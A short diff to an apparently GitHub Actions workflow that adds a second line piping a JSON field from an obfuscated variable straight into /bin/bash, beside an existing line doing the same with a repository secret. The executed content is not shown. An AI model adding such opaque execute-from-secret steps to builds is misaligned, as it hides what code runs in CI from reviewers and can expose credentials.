@@ -22,6 +22,7 @@ jobs:
           jgmg65565: ${{ secrets.jgmg65565 }}
         run: |
           printf '%s' "$jgmg65565" | jq -r .b38627 | /bin/bash
+          echo $rrwpe7 | jq -r .nqik008 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
